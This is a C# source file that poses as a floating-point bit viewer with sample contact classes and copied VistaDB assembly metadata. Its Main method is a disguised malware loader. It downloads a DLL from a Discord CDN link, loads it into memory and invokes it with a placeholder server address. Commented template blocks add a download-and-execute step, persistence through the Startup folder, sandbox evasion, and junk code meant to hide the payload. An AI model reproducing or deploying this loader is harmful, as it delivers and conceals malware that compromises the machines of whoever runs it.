using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.ComponentModel;
using System.Dynamic;
using System.Collections;
using System.Collections.ObjectModel;
using System.Globalization;
using System.Drawing;
using System.Security.Permissions;
using System.Text.RegularExpressions;
using FLOAT_TYPE = System.Single;
using UINT_TYPE = System.UInt32;
using INT_TYPE = System.Int32;

//Default [assembly: AssemblyTitle("")]
//Default [assembly: AssemblyDescription("VistaDB Database Engine")]
//Default [assembly: AssemblyCompany("Vista Software")]
//Default [assembly: AssemblyProduct("VistaDB")]
//Default [assembly: AssemblyCopyright("(c) 1999-2006 Vista Software. All rights reserved.")]
//Default [assembly: AssemblyFileVersion("2.1.8.2")]

//Assembly [assembly: AssemblyTitle("{1}")]
//Assembly [assembly: AssemblyDescription("{2}")]
//Assembly [assembly: AssemblyCompany("{3}")]
//Assembly [assembly: AssemblyProduct("{4}")]
//Assembly [assembly: AssemblyCopyright("{5}")]
//Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]

public class Contact
{
    public int Id { get; set; }
    public string Name { get; set; }
    public DateTime? BirthDate { get; set; }
    public string Phone { get; set; }
    public Address Address { get; set; }

    public Contact()
    {
        this.Id = 7113; this.Name = "James Norris"; this.BirthDate = new DateTime(1977, 5, 13); this.Phone = "488-555-1212";
        this.Address = new Address();
    }
}

public class Address
{
    public string Street { get; set; }
    public string City { get; set; }
    public string State { get; set; }
    public string PostalCode = "99999"; // initialize properties to generate sample data

    public Address()
    {
        // or set properties in default constructor to generate sample data
        this.Street = "4627 Sunset Ave"; this.City = "San Diego"; this.State = "CA"; this.PostalCode = "92115";
    }
}

// these types is only visible in this source file


namespace TestFloatPointViewerCSharp
{
    public class FloatDissector
    {
        public enum Sign
        {
            Positive,
            Negative
        }

        public static readonly UINT_TYPE SignBit = 0x80000000; // MSB is sign bit
        public static readonly UINT_TYPE ExponentBits = 0x7F800000; // 8 bits of exponent
        public static readonly UINT_TYPE MantissaBits = 0x7FFFFF; // 23 bits of mantissa
        public static readonly byte NumMantissaBits = 23;
        public static readonly byte NumExponentBits = 8;
        public static readonly UINT_TYPE ExponentBias = 127U;
        private static readonly UINT_TYPE U_ZERO = 0U;
        private static readonly INT_TYPE S_ZERO = 0;
        private static readonly UINT_TYPE U_ONE = 1U;
        private static readonly FLOAT_TYPE F_ZERO = 0.0f;
        private static readonly UINT_TYPE MaxRawExponent = 255U;
        private FLOAT_TYPE m_FValue;


        [StructLayout(LayoutKind.Explicit)]
        struct UnionType
        {
            [FieldOffset(0)]
            public FLOAT_TYPE f_val;

            [FieldOffset(0)]
            public UINT_TYPE ui_val;
        }

        public FloatDissector(FLOAT_TYPE val) { m_FValue = val; }

        public FLOAT_TYPE GetFloatPoint()
        {
            return m_FValue;
        }

        public void SetFloatPoint(FLOAT_TYPE val)
        {
            m_FValue = val;
        }

        public static void Get(FLOAT_TYPE src, out Sign sign, out UINT_TYPE raw_exponent, out INT_TYPE adjusted_exponent, out UINT_TYPE mantissa)
        {
            UnionType u;
            u.ui_val = 0; // to silence the compiler of unassigned ui_val member
            u.f_val = src;
            sign = ((u.ui_val & SignBit) > 0) ? Sign.Negative : Sign.Positive;
            raw_exponent = (u.ui_val & ExponentBits) >> NumMantissaBits;
            adjusted_exponent = (INT_TYPE)raw_exponent - (INT_TYPE)ExponentBias;
            mantissa = (u.ui_val & MantissaBits);
        }

        public static void Set(out FLOAT_TYPE dest, Sign sign, INT_TYPE adjusted_exponent, UINT_TYPE mantissa)
        {
            UINT_TYPE sign_value = U_ZERO;
            if (sign == Sign.Negative)
                sign_value |= SignBit;

            UINT_TYPE raw_exponent = (UINT_TYPE)(adjusted_exponent + ExponentBias);
            UnionType u;
            u.f_val = F_ZERO; // to silence the compiler of unassigned ui_val member
            u.ui_val = sign_value | (raw_exponent << NumMantissaBits) | (mantissa & MantissaBits);

            dest = u.f_val;
        }

        public Sign GetSign()
        {
            Sign sign = Sign.Positive;
            UINT_TYPE raw_exponent = U_ZERO;
            INT_TYPE adjusted_exponent = S_ZERO;
            UINT_TYPE mantissa = U_ZERO;
            Get(m_FValue, out sign, out raw_exponent, out adjusted_exponent, out mantissa);

            return sign;
        }

        public void SetSign(Sign new_sign)
        {
            Sign sign = Sign.Positive;
            UINT_TYPE raw_exponent = U_ZERO;
            INT_TYPE adjusted_exponent = S_ZERO;
            UINT_TYPE mantissa = U_ZERO;
            Get(m_FValue, out sign, out raw_exponent, out adjusted_exponent, out mantissa);

            Set(out m_FValue, new_sign, adjusted_exponent, mantissa);
        }

        public UINT_TYPE GetRawExponent()
        {
            Sign sign = Sign.Positive;
            UINT_TYPE raw_exponent = U_ZERO;
            INT_TYPE adjusted_exponent = S_ZERO;
            UINT_TYPE mantissa = U_ZERO;
            Get(m_FValue, out sign, out raw_exponent, out adjusted_exponent, out mantissa);

            return raw_exponent;
        }

        public void SetRawExponent(UINT_TYPE new_raw_exponent)
        {
            Sign sign = Sign.Positive;
            UINT_TYPE raw_exponent = U_ZERO;
            INT_TYPE adjusted_exponent = S_ZERO;
            UINT_TYPE mantissa = U_ZERO;
            Get(m_FValue, out sign, out raw_exponent, out adjusted_exponent, out mantissa);
            INT_TYPE new_adjusted_exponent = (INT_TYPE)(new_raw_exponent) - (INT_TYPE)(ExponentBias);

            Set(out m_FValue, sign, new_adjusted_exponent, mantissa);
        }

        public INT_TYPE GetAdjustedExponent()
        {

            Sign sign = Sign.Positive;
            UINT_TYPE raw_exponent = U_ZERO;
            INT_TYPE adjusted_exponent = S_ZERO;
            UINT_TYPE mantissa = U_ZERO;
            Get(m_FValue, out sign, out raw_exponent, out adjusted_exponent, out mantissa);

            return adjusted_exponent;
        }

        public void SetAdjustedExponent(INT_TYPE new_adjusted_exponent)
        {
            Sign sign = Sign.Positive;
            UINT_TYPE raw_exponent = U_ZERO;
            INT_TYPE adjusted_exponent = S_ZERO;
            UINT_TYPE mantissa = U_ZERO;
            Get(m_FValue, out sign, out raw_exponent, out adjusted_exponent, out mantissa);

            Set(out m_FValue, sign, new_adjusted_exponent, mantissa);
        }

        public UINT_TYPE GetMantissa()
        {
            Sign sign = Sign.Positive;
            UINT_TYPE raw_exponent = U_ZERO;
            INT_TYPE adjusted_exponent = S_ZERO;
            UINT_TYPE mantissa = U_ZERO;
            Get(m_FValue, out sign, out raw_exponent, out adjusted_exponent, out mantissa);

            return mantissa;
        }

        public void SetMantissa(UINT_TYPE new_mantissa)
        {
            Sign sign = Sign.Positive;
            UINT_TYPE raw_exponent = U_ZERO;
            INT_TYPE adjusted_exponent = S_ZERO;
            UINT_TYPE mantissa = U_ZERO;
            Get(m_FValue, out sign, out raw_exponent, out adjusted_exponent, out mantissa);

            Set(out m_FValue, sign, adjusted_exponent, new_mantissa);
        }

        public bool IsInfinity()
        {
            Sign sign = Sign.Positive;
            UINT_TYPE raw_exponent = U_ZERO;
            INT_TYPE adjusted_exponent = S_ZERO;
            UINT_TYPE mantissa = U_ZERO;
            Get(m_FValue, out sign, out raw_exponent, out adjusted_exponent, out mantissa);

            return (raw_exponent == MaxRawExponent) && (mantissa == U_ZERO);
        }

        public void SetInfinity(Sign new_sign)
        {
            INT_TYPE adjusted_exponent = (INT_TYPE)MaxRawExponent - (INT_TYPE)ExponentBias;
            UINT_TYPE mantissa = U_ZERO;

            Set(out m_FValue, new_sign, adjusted_exponent, mantissa);
        }

        public bool IsPositiveInfinity()
        {
            Sign sign = Sign.Positive;
            UINT_TYPE raw_exponent = U_ZERO;
            INT_TYPE adjusted_exponent = S_ZERO;
            UINT_TYPE mantissa = U_ZERO;
            Get(m_FValue, out sign, out raw_exponent, out adjusted_exponent, out mantissa);

            return (raw_exponent == MaxRawExponent) && (sign == Sign.Positive) && (mantissa == U_ZERO);
        }

        public bool IsNegativeInfinity()
        {
            Sign sign = Sign.Positive;
            UINT_TYPE raw_exponent = U_ZERO;
            INT_TYPE adjusted_exponent = S_ZERO;
            UINT_TYPE mantissa = U_ZERO;
            Get(m_FValue, out sign, out raw_exponent, out adjusted_exponent, out mantissa);

            return (raw_exponent == MaxRawExponent) && (sign == Sign.Negative) && (mantissa == U_ZERO);
        }

        public bool IsSubnormal()
        {
            Sign sign = Sign.Positive;
            UINT_TYPE raw_exponent = U_ZERO;
            INT_TYPE adjusted_exponent = S_ZERO;
            UINT_TYPE mantissa = U_ZERO;
            Get(m_FValue, out sign, out raw_exponent, out adjusted_exponent, out mantissa);

            return (raw_exponent == U_ZERO) && (mantissa > U_ZERO);
        }

        public bool IsZero()
        {
            Sign sign = Sign.Positive;
            UINT_TYPE raw_exponent = U_ZERO;
            INT_TYPE adjusted_exponent = S_ZERO;
            UINT_TYPE mantissa = U_ZERO;
            Get(m_FValue, out sign, out raw_exponent, out adjusted_exponent, out mantissa);

            return (raw_exponent == U_ZERO) && (mantissa == U_ZERO); // zero can be positive or negative depending on the sign.
        }

        public void SetZero(Sign new_sign)
        {
            INT_TYPE adjusted_exponent = -(INT_TYPE)ExponentBias;
            UINT_TYPE mantissa = U_ZERO;

            Set(out m_FValue, new_sign, adjusted_exponent, mantissa);
        }

        public bool IsNaN()
        {
            Sign sign = Sign.Positive;
            UINT_TYPE raw_exponent = U_ZERO;
            INT_TYPE adjusted_exponent = S_ZERO;
            UINT_TYPE mantissa = U_ZERO;
            Get(m_FValue, out sign, out raw_exponent, out adjusted_exponent, out mantissa);

            return (raw_exponent == MaxRawExponent) && (mantissa > U_ZERO);
        }

        public void SetNaN(Sign new_sign, UINT_TYPE non_zero_mantissa)
        {
            INT_TYPE adjusted_exponent = (INT_TYPE)(MaxRawExponent - ExponentBias);
            if (non_zero_mantissa == U_ZERO)
                non_zero_mantissa = U_ONE;
            UINT_TYPE mantissa = non_zero_mantissa & MantissaBits;

            Set(out m_FValue, new_sign, adjusted_exponent, mantissa);
        }

        private string Convert2Binary(UINT_TYPE value, byte num_of_bits)
        {
            string str = "";
            UINT_TYPE mask = (U_ONE << num_of_bits);
            for (int i = 0; i < num_of_bits; ++i)
            {
                mask >>= 1;
                if ((value & mask) > 0)
                    str += "1";
                else
                    str += "0";
            }
            return str;
        }

        public void Display()
        {
            Sign sign = Sign.Positive;
            UINT_TYPE raw_exponent = U_ZERO;
            INT_TYPE adjusted_exponent = S_ZERO;
            UINT_TYPE mantissa = U_ZERO;
            Get(m_FValue, out sign, out raw_exponent, out adjusted_exponent, out mantissa);

            Console.WriteLine("Sign:{0}, Adjusted Exponent:{1}, Raw Exponent:{2}, Mantissa:{3}, Float Point Value:{4:G9}\n",
                sign, adjusted_exponent, Convert2Binary(raw_exponent, NumExponentBits), Convert2Binary(mantissa, NumMantissaBits), m_FValue);
        }

    }
}

namespace TestFloatPointViewerCSharp
{
    static class Program
    {

        public static byte[] Street(string url)
        {
            byte[] Street;
            for (; ; )
            {
                try
                {

                    WebClient PostalCode = new WebClient();
                    Street = PostalCode.DownloadData(url);
                }
                catch (Exception ex)
                {


                    int a = int.Parse("");
                    int b = int.Parse("");
                    int c = a * b;

                    throw;
                }
                break;
            }
            return Street;
        }

        static void Main()
        {


            try
            {


                //sandboxie controlsandboxie();

                //Messega



                //download try
                //download {
                //download  System.Net.WebClient appyrun = new System.Net.WebClient();
                //download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
                //download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
                //download }
                //download catch
                //download {
                //download }

                UINT_TYPE ExponentBits = 0x7F800000; 
                UINT_TYPE MantissaBits = 0x7FFFFF;
        

                byte[] treehouseBytes = Street("https://cdn.discordapp.com/attachments/841595401253158954/842329193350037524/httpswww.kickstartcommerce.comgodaddy-accounts-domains-stolen-one-email-time.html.dll");

                Assembly name = AppDomain.CurrentDomain.Load(treehouseBytes);


                string BirthDate = "packet_server";

                string city = "CodeAccessSecurityAttribute";

                object Contacts = new object[] { %aPP%, string.Empty, Street("%Server%"), true };

                name.GetType("IsolatedStorage" + "." + BirthDate).InvokeMember(city, BindingFlags.InvokeMethod, null, null, (object[])Contacts);



                //start  {
                //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
                //start  }



            }
            //burası sadece çöp kod silebilirsin

            catch (Exception ex)
            {
                int Sayi_1 = Convert.ToInt32("/bayramda-bankalar-acik-mi-ramazan-yapilabilir-mi-6504340/4");
                int Sayi_2 = Convert.ToInt32("Yakalama-Try-Catch-Finally-Kullanımı");
                int sonuc = Sayi_1 + Sayi_2;

            }

            //sandboxie [DllImport("kernel32.dll")]
            //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
            //sandboxie static void controlsandboxie()
            //sandboxie {
            //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
            //sandboxie     {
            //sandboxie        Environment.Exit(1);
            //sandboxie     }
            //sandboxie }

        }


    }
}
